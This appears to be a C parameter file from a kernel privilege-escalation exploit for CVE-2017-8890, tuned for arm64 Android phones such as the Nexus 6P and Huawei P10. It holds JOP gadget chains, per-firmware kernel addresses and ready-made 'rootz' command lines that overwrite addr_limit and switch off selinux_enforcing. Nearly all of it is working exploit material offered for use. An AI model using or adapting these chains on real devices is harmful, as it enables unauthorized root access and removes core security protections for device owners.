/*
 * CVE-2017-8890 exploit adp args
 * used for arm64 like Nexus6P, HuaWeiP10, ...
 * Copyright (C) 2017 by idhyt3r@gmail.com
 * https://source.android.com/security/bulletin/2017-09-01
 *
 */

#include "param.h"

/* 

  通用内核函数地址定义在 param.h 头文件中
  
  针对不同手机适配需要特殊定义的，在该头文件中定义

*/


// #define TEST_FOR_TEST

#ifdef TEST_FOR_TEST

// selinux

/*

200=0xffffffc0000f8348;

x19  
201=0xffffffc0000f8348
0xffffffc0000f833c irq_do_set_affinity 0x60
...
0xffffffc0000f8348: mov x19, x0    x19 = x0 = jop_buf
0xffffffc0000f834c: mov x20, x1    x20 = x1 = jop_buf
0xffffffc0000f8350: ldr x3, [x0, #0x18]    [jop_buf + 0x18] = jop_buf
0xffffffc0000f8354: ldr x3, [x3, #0x50]    [jop_buf + 0x50] = 0xffffffc0005b8210
0xffffffc0000f8358: blr x3

x0 = 0xffffffc040404040
0xffffffc0005b8208 _regmap_bus_reg_write 0x20
...
0xffffffc0005b8210: ldr x3, [x0, #0xb0]    [jop_buf + 0xb0] = jop_buf
0xffffffc0005b8214: ldr x0, [x0, #0xb8]    [jop_buf + 0xb8] = 0xffffffco40404040
0xffffffc0005b8218: ldr x3, [x3, #0x20]    [jop_buf + 0x20] = 0xffffffc000f58fb0
0xffffffc0005b821c: blr x3

x1 = ptmx_fops.check_flags
0xffffffc000f58f84 ethtool_get_rxfh_indir 0x1c0
...
0xffffffc000f58fb0: ldr x2, [x1, #0x110]    [jop_buf + 0x110] = 0xffffffc00060e848
0xffffffc000f58fb4: cbz x2, #0xffffffc000f59138    
0xffffffc000f58fb8: ldr x1, [x1, #0x118]    [jop_buf + 0x118] = ptmx_fops.check_flags - 8
0xffffffc000f58fbc: cbz x1, #0xffffffc000f59138
0xffffffc000f58fc0: blr x2

patch
0xffffffc00060e828 part_erase 0x6c
...
0xffffffc00060e848: str x0, [x1, #8]    patch
0xffffffc00060e84c: ldr x2, [x20, #0x4b8]    [jop_buf + 0x4b8] = jop_buf
0xffffffc00060e850: mov x0, x2
0xffffffc00060e854: ldr x2, [x2, #0x68]      [jop_buf + 0x68] = ret
0xffffffc00060e858: blr x2

adb shell "/data/local/tmp/rootz 'n=1003&k=[200=0xffffffc0000f8348;101=0xffffffc001dfbaf8;103=0xa8;104=0xffffffc001996fc0;105=0x78;109=0x8;]&j=[0x18=0xaaaaaaaa;0x50=0xffffffc0005b8210;0xb0=0xaaaaaaaa;0xb8=0xffffffc000f331a4;0x20=0xffffffc000f58fb0;0x110=0xffffffc00060e848;0x118=0xbbbbbbbb;0x4b8=0xaaaaaaaa;0x68=0xFFFFFFC00010356C;0x0=0x0;0x28=0xaaaaaaaa;0x48=0xffffffc0001e84e4;0x0=0x0;]&p=[0xffffffc001dabb54=0x0=0x4;]'"

*/



// to patch ptmx_ioctl
struct jop_gadget jop1[0x10] = {
  {0x18, 0xaaaaaaaa,},    //jop_buf
  {0x50, 0xffffffc0005b8210,},
  {0xb0, 0xaaaaaaaa,},   // jop_buf
  {0xb8, 0xffffffc000f331a4,},  // kernel_sock_ioctl
  {0x20, 0xffffffc000f58fb0},
  {0x110, 0xffffffc00060e848},
  {0x118, 0xbbbbbbbb},  // ptmx_fops.check_flags - 8
  {0x4b8, 0xaaaaaaaa},
  {0x68, 0xFFFFFFC00010356C},  // rcu_process_callbacks
  {0, 0,},
};

// set_fs to patch thread_info->addr_limit
struct jop_gadget jop2[0x10] = {
  {0x28, 0xaaaaaaaa,},
  {0x48, 0xffffffc0001e84e4,},    // check_flags(), back
  {0, 0,},
};

unsigned long adp_tty_ioctl = (unsigned long)0x51890c;

// to patch memory
struct patch_gadget patch_mem[0x10] = {
  {adp_selinux_enforcing, 0x00, sizeof(int)},  // selinux_enforcing
  {(unsigned long)0xffffffc001dfbaf8 + 0xa8, 0, sizeof(long)},
  {0, 0,},
};


#endif


#if 0

适配信息 

华为p10 ro.product.model=generic_a15

// VTR-AL00C00B137
Linux version 4.1.18-gf5b4220 (android@localhost) (gcc version 4.9 20150123 (prerelease) (GCC) ) #1 SMP PREEMPT Wed Apr 12 03:17:23 CST 2017

n=1003&k=[200=0xffffffc0000f8348;101=0xffffffc001dfbaf8;103=0xa8;104=0xffffffc001996fc0;105=0x78;109=0x4;]&j=[0x18=0xaaaaaaaa;0x50=0xffffffc0005b8210;0xb0=0xaaaaaaaa;0xb8=0xffffffc000f331a4;0x20=0xffffffc000f58fb0;0x110=0xffffffc00060e848;0x118=0xbbbbbbbb;0x4b8=0xaaaaaaaa;0x68=0xFFFFFFC00010356C;0x0=0x0;0x28=0xaaaaaaaa;0x48=0xffffffc0001e84e4;0x0=0x0;]&p=[0xffffffc001dabb54=0x0=0x4;0xffffffc001dfbba0=0x0=0x8;]

// Victoria-AL00A_C00B109SP01
Linux version 4.1.18-gfd75bbb (android@localhost) (gcc version 4.9 20150123 (prerelease) (GCC) ) #1 SMP PREEMPT Thu Mar 2 17:29:20 CST 2017
n=1003&k=[200=0xFFFFFFC0000F7F2C;101=0xffffffc001de7ad0;103=0xa8;104=0xffffffc00198efc0;105=0x78;109=0x4;]&j=[0x18=0xaaaaaaaa;0xb0=0xaaaaaaaa;0x4b8=0xaaaaaaaa;0x118=0xbbbbbbbb;0x50=0xFFFFFFC0005B5844;0xb8=0xFFFFFFC000F2EFF4;0x20=0xFFFFFFC000F54E14;0x110=0xFFFFFFC00060D0D0;0x68=0xFFFFFFC00010314C;0x0=0x0;0x28=0xaaaaaaaa;0x48=0xFFFFFFC0001E7EDC;0x0=0x0;]&p=[0xffffffc001d99b14=0x0=0x4;0xffffffc001de7b78=0x0=0x8;]

荣耀5C 移动 ro.product.model=hi6250
// NEM-TL00C01B191
Linux version 3.10.90-g1e8f015 (android@localhost) (gcc version 4.9.x-google 20140827 (prerelease) (GCC) ) #1 SMP PREEMPT Fri Jan 20 03:30:14 CST 2017

n=1003&k=[200=0xffffffc00020a6dc;101=0xffffffc001674b10;103=0xa0;104=0xffffffc00135c860;105=0x70;109=0x4;801=0xffffffc00166aa10;802=0xffffffc00166aa28;]&j=[0x20=0xcccccccc;0x100=0xffffffc000205528;0x108=0xdddddddd;0x118=0xdddddddd;0x110=0xeeeeeeee;0x218=0xdddddddd;0x290=0xdddddddd;0x210=0xffffffc000348510;0x238=0xffffffff;0x310=0xffffffc000121308;0x328=0xffffffc000ab07c4;0x0=0x0;0x28=0xaaaaaaaa;0x48=0xffffffc0001aacd8;0x0=0x0;]&p=[0xffffffc0016672c4=0x0=0x4;0xffffffc001674bb0=0x0=0x8;]

nexus6p
Linux version 3.10.73-g5b0be8f02fe (android-build@wphs1.hot.corp.google.com) (gcc version 4.9.x-google 20140827 (prerelease) (GCC) ) #1 SMP PREEMPT Thu Jun 8 18:03:16 UTC 2017
n=1003&k=[101=0xffffffc001a044a0;103=0xa8;104=0xffffffc001779fe0;105=0x70;109=0x4;200=0xffffffc00074c954;]&j=[0x180=0xaaaaaaaa;0x158=0xaaaabbbb;0x2d0=0xffffffc000afe07c;0x0=0x0;0x28=0xaaaaaaaa;0x48=0xffffffc0003176c4;0x0=0x0;]&p=[0xffffffc00193a1bc=0x0=0x4;0xffffffc001a04548=0x0=0x8;]

------------------------------------------------------------------------------------------------------------------------
// FRD-AL00C00B368

Linux version 4.1.18-gf6402d0 (android@localhost) (gcc version 4.9 20150123 (prerelease) (GCC) ) #1 SMP PREEMPT Tue Jan 10 12:54:47 CST 2017

ptmx_fops.check_flags - 8 = 0xbbbbbbbb;
rcu_process_callbacks = 0xffffffc0000fb1ec;
kernel_sock_ioctl = 0xffffffc000cfcc74;


ROM:FFFFFFC0000F0D7C irq_do_set_affinity
ROM:FFFFFFC0000F0D88                 MOV             X19, X0
ROM:FFFFFFC0000F0D8C                 MOV             X20, X1
ROM:FFFFFFC0000F0D90                 LDR             X3, [X0,#0x18]             [jop_buf + 0x18] = jop_buf + 0x100
ROM:FFFFFFC0000F0D94                 LDR             X3, [X3,#0x50]             [jop_buf + 0x100 + 0x50] = 0xFFFFFFC000E1B148
ROM:FFFFFFC0000F0D98                 BLR             X3

ROM:FFFFFFC000E1B0DC fib6_clean_node
ROM:FFFFFFC000E1B148                 LDR             X2, [X20,#0x50]            [jop_buf + 0x50] = 0xFFFFFFC00052F814
ROM:FFFFFFC000E1B14C                 LDR             X1, [X20,#0x60]            [jop_buf + 0x60] = check_flags - 8
ROM:FFFFFFC000E1B150                 MOV             X0, X19
ROM:FFFFFFC000E1B154                 BLR             X2


ROM:FFFFFFC00052F80C _regmap_bus_reg_write                   ; DATA XREF: regmap_init+304o
ROM:FFFFFFC00052F814                 LDR             X3, [X0,#0xB0]             [jop_buf + 0xb0] = jop_buf + 0x100
ROM:FFFFFFC00052F818                 LDR             X0, [X0,#0xB8]             [jop_buf + 0xb8] = 0xffffffc000cfcc74
ROM:FFFFFFC00052F81C                 LDR             X3, [X3,#0x20]             [jop_buf + 0x100 + 0x20] = 0xFFFFFFC000562DC4
ROM:FFFFFFC00052F820                 BLR             X3

0xFFFFFFC000562DC4
ROM:FFFFFFC000562DC4                 STR             X0, [X1,#8]              patch
ROM:FFFFFFC000562DC8                 LDR             X2, [X20,#0x4B0]         [jop_buf + 0x4b0] = jop_buf
ROM:FFFFFFC000562DCC                 MOV             X0, X2
ROM:FFFFFFC000562DD0                 LDR             X2, [X2,#0x68]           [jop_buf + 0x68] = 0xffffffc0000fb1ec
ROM:FFFFFFC000562DD4                 BLR             X2

./data/local/tmp/rootz "n=1003&k=[200=0xffffffc0000f0d88;101=0xffffffc001b8da48;103=0xa8;104=0xffffffc001692e00;105=0x70;109=0x8;]&j=[0x18=0xcccccccc;0x150=0xFFFFFFC000E1B148;0x50=0xFFFFFFC00052F814;0x60=0xbbbbbbbb;0xb0=0xcccccccc;0xb8=0xffffffc000cfcc74;0x120=0xFFFFFFC000562DC4;0x4b0=0xaaaaaaaa;0x68=0xffffffc0000fb1ec;0x0=0x0;0x28=0xaaaaaaaa;0x48=0xffffffc0001ce6e4;0x0=0x0;]&p=[0xffffffc001b5df5c=0x0=0x4;]"

------------------------------------------------------------------------------------------------------------------------




#endif